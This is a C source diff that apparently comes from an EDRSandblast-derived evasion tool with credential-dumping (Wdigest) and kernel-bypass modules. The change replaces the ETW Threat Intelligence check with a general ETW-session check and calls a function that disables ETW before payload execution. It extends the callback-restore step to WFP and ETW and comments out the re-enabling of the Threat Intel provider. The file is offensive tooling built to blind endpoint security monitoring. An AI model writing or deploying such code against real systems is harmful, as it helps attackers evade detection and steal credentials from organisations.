@@ -31,6 +31,7 @@
 #include "WdigestOffsets.h"
 
 #include "../EDRSandblast/EDRSandblast.h"
+#include "../KernellandBypass/kernel.h"
 #include "../KernellandBypass/memory.h"
 #include "../KernellandBypass/symbol.h"
 #include "../KernellandBypass/wfp.h"
@@ -184,7 +185,7 @@ Other options:\n\
     BOOL kernelMode = FALSE;
     int lpExitCode = EXIT_SUCCESS;
     struct FOUND_EDR_CALLBACKS* foundEDRDrivers = NULL;
-    BOOL ETWTIState = FALSE;
+    BOOL ETWState = FALSE;
     BOOL foundNotifyRoutineCallbacks = FALSE;
     BOOL foundObjectCallbacks = FALSE;
     BOOL foundMinifilterCallbacks = FALSE;
@@ -501,11 +502,11 @@ LocalFree(moduleRawList);
         }
         _putts_or_not(TEXT(""));
 
-        _putts_or_not(TEXT("[+] [ETWTI]\tChecking the ETW Threat Intelligence Provider state..."));
-        ETWTIState = isETWThreatIntelProviderEnabled(verbose);
-        _tprintf_or_not(TEXT("[+] [ETWTI]\tETW Threat Intelligence Provider is %s!\n"), ETWTIState ? TEXT("ENABLED") : TEXT("DISABLED"));
+        _putts_or_not(TEXT("[+] [ETW]\tChecking if ETW sessions are active..."));
+        ETWState = EnumEtw();
+        _tprintf_or_not(TEXT("[+] [ETWTI]\tETW sessions are %s!\n"), ETWState ? TEXT("active") : TEXT("inactive"));
         _putts_or_not(TEXT(""));
-        if (ETWTIState) {
+        if (ETWState) {
             isSafeToExecutePayloadKernelland = FALSE;
         }
     }
@@ -702,8 +703,8 @@ LocalFree(moduleRawList);
             * 1/3 : Removing kernel-based monitoring.
             */
             // Disable (temporarily) ETW Threat Intel functions by patching the ETW Threat Intel provider ProviderEnableInfo.
-            if (ETWTIState) {
-                DisableETWThreatIntelProvider(verbose);
+            if (ETWState) {
+                DisableEtw();
                 _putts_or_not(TEXT(""));
             }
             // If kernel callbacks are monitoring processes, we remove them and start a new process.
@@ -766,18 +767,18 @@ LocalFree(moduleRawList);
                 EnableEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
                 _putts_or_not(TEXT(""));
             }
-            if (restoreCallbacks == TRUE && foundMinifilterCallbacks) {
-                _putts_or_not(TEXT("[+] Restoring EDR's minifilter callbacks..."));
+            if (restoreCallbacks == TRUE && (foundMinifilterCallbacks || foundWfp || ETWState)) {
+                _putts_or_not(TEXT("[+] Restoring EDR's minifilter || wfp || ETW..."));
                 Restore();
                 _putts_or_not(TEXT(""));
             }
 
             // Renable the ETW Threat Intel provider.
             // TODO : make this conditionnal, just as kernel callbacks restoring ?
-            if (ETWTIState) {
-                EnableETWThreatIntelProvider(verbose);
-                _putts_or_not(TEXT(""));
-            }
+            // if (ETWTIState) {
+            //     EnableETWThreatIntelProvider(verbose);
+            //     _putts_or_not(TEXT(""));
+            // }
 
             if (foundEDRDrivers) {
                 free(foundEDRDrivers);
